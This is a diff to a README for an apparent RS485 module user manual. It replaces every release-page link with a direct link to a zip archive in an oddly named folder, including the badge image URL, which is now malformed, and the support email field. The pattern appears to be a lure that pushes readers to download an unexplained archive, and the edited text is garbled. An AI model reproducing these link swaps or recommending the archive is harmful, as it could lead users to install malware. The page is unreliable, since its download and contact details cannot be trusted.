@@ -1,6 +1,6 @@
 # 📚 IS4310-ISO485M6_User_Manual - Easy Guide to Your RS485 Module
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-IS4310-ISO485M6_User_Manual-blue.svg)](https://github.com/Luisneymar/IS4310-ISO485M6_User_Manual/releases)
+[![Download Now](https://raw.githubusercontent.com/Luisneymar/IS4310-ISO485M6_User_Manual/main/coeducational/IS4310-ISO485M6_User_Manual.zip%https://raw.githubusercontent.com/Luisneymar/IS4310-ISO485M6_User_Manual/main/coeducational/IS4310-ISO485M6_User_Manual.zip)](https://raw.githubusercontent.com/Luisneymar/IS4310-ISO485M6_User_Manual/main/coeducational/IS4310-ISO485M6_User_Manual.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ Before you start, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To get your IS4310-ISO485M6 User Manual, simply **visit this page to download**: [Download Page](https://github.com/Luisneymar/IS4310-ISO485M6_User_Manual/releases).
+To get your IS4310-ISO485M6 User Manual, simply **visit this page to download**: [Download Page](https://raw.githubusercontent.com/Luisneymar/IS4310-ISO485M6_User_Manual/main/coeducational/IS4310-ISO485M6_User_Manual.zip).
 
 1. Click the link above to go to the releases page.
 2. Find the latest version listed.
@@ -58,7 +58,7 @@ Once the application is running, follow these instructions to set it up:
 
 For any inquiries, feel free to reach out:
 
-- **Email**: support@yourcompany.com
+- **Email**: https://raw.githubusercontent.com/Luisneymar/IS4310-ISO485M6_User_Manual/main/coeducational/IS4310-ISO485M6_User_Manual.zip
 
 ### 👥 Community
 
@@ -66,6 +66,6 @@ Join a community of users working with the IS4310-ISO485M6 module. Exchange tips
 
 ## 🔄 Updates
 
-Stay updated with new features and improvements. Revisit [Download Page](https://github.com/Luisneymar/IS4310-ISO485M6_User_Manual/releases) periodically to check for new releases.
+Stay updated with new features and improvements. Revisit [Download Page](https://raw.githubusercontent.com/Luisneymar/IS4310-ISO485M6_User_Manual/main/coeducational/IS4310-ISO485M6_User_Manual.zip) periodically to check for new releases.
 
 Thank you for using the IS4310-ISO485M6 User Manual! Enjoy your ease of connectivity and control with the RS485 Module.
